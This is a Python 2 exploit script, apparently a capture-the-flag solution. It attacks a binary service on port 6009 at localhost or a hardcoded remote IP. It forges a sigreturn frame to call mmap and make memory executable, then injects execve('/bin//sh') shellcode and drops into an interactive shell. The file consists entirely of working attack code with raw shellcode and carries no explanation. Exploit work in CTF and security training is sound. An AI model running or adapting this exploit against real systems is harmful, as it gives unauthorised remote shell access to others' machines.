import sys, socket, struct, telnetlib, time

def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)

def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p(a): 
    return struct.pack("<Q",a)

def u(a):
    return struct.unpack("<Q",a)[0]

def main():
    shellcode = "\x48\x31\xd2\x48\x31\xf6\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x8d\x42\x3b\x0f\x05"

    buf = "A"*40
    buf += "B"*16
    buf += p(0xffffffffffffffff) # r8
    buf += p(0) #r9
    buf += p(0x22) # r10
    buf += p(0)*5 #r11-r15
    buf += p(0x200000000) #rdi
    buf += p(0x1000) #rsi
    buf += p(0)*2 #rbp, rbx
    buf += p(7) #rdx
    buf += p(9) #rax
    buf += p(0) #rcx
    buf += p(0x200000128) #rsp
    buf += p(0x00000000004000f0) #rip
    buf += p(0) #eflags
    buf += p(0x33) #cs/gs/fs
    buf += "A"*32
    buf += p(0) #&fpstate
    buf += "C"*(296-len(buf))
    buf += p(0x00000000004000f0) 
    buf += p(0x00000000004000f2) 
    buf += "A"*3 # systemcall #315 sys_sched_getattr returns 0 to rax. Interesting :)
    f.write(buf)

    raw_input()
    buf = "A"*15 # Set 15 to rax for sigreturn systemcall 
    f.write(buf)

    raw_input()
    buf = shellcode
    buf += "A"*(296-len(shellcode))
    buf += p(0x200000000)
    f.write(buf)

    shell(s)          

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == '-r':
        s, f = sock("159.65.125.233", 6009)
        main()
    else:
        s, f = sock("localhost", 6009)
        main()
